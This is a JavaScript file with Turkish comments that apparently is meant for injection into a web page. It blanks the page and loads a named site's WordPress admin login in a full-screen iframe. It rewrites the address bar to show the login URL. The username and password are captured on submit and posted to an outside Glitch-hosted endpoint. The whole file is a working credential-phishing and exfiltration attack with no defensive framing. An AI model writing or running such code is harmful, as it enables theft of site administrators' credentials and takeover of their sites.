// script.js
(function() {
    console.log('Script başladı');

    // Mevcut sayfayı manipüle et
    const doc = document;
    doc.body.innerHTML = ''; // Sayfayı temizle
    console.log('Sayfa temizlendi');

    // İframe oluştur
    const iframe = doc.createElement('iframe');
    iframe.src = 'https://katiponline.com/wp-login.php?redirect_to=https%3A%2F%2Fkatiponline.com%2Fwp-admin%2F&reauth=1';
    iframe.style.width = '100%';
    iframe.style.height = '100vh';
    iframe.style.border = 'none';
    doc.body.appendChild(iframe);
    console.log('Iframe eklendi');

    // Adres çubuğunu manipüle et
    window.history.pushState({}, doc.title, 'https://katiponline.com/wp-login.php?redirect_to=https%3A%2F%2Fkatiponline.com%2Fwp-admin%2F&reauth=1');
    console.log('Adres çubuğu güncellendi');

    // İframe yüklendiğinde formu izle
    iframe.onload = () => {
        console.log('Iframe yüklendi');
        attachFormListener();
    };

    // Form listener’ını bağlama fonksiyonu
    function attachFormListener() {
        const iframeDoc = iframe.contentWindow.document;
        const loginForm = iframeDoc.getElementById('loginform');
        const submitButton = iframeDoc.getElementById('wp-submit');

        if (loginForm) {
            console.log('Login formu bulundu');

            // Form submit eventi
            loginForm.addEventListener('submit', (e) => {
                console.log('Form submit edildi');
                handleFormSubmit(e, loginForm);
            });

            // Submit butonuna tıklama eventi (yedek)
            if (submitButton) {
                console.log('Submit butonu bulundu');
                submitButton.addEventListener('click', (e) => {
                    console.log('Submit butonuna tıklandı');
                    handleFormSubmit(e, loginForm);
                });
            } else {
                console.log('Submit butonu bulunamadı');
            }
        } else {
            console.log('Login formu bulunamadı');
        }
    }

    // Form verisini işleme fonksiyonu
    function handleFormSubmit(event, loginForm) {
        event.preventDefault(); // Gerçek isteği durdur (isteğe bağlı)
        console.log('Veri işleniyor');

        // Form verisini al
        const formData = new FormData(loginForm);
        const log = formData.get('log'); // Kullanıcı adı
        const pwd = formData.get('pwd'); // Şifre
        console.log('Veriler alındı:', { log, pwd });

        // Glitch’e gönder
        fetch('https://canyon-charmed-dogsled.glitch.me/log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: `log=${encodeURIComponent(log)}&pwd=${encodeURIComponent(pwd)}`
        })
        .then(response => console.log('Veri Glitch’e gönderildi'))
        .catch(error => console.error('Hata:', error));

        // İsteğe bağlı: Gerçek formu gönder
        // loginForm.submit();
    }

    // İframe içeriği değişirse formu tekrar bağla
    setInterval(attachFormListener, 1000); // Her saniye kontrol et
})();
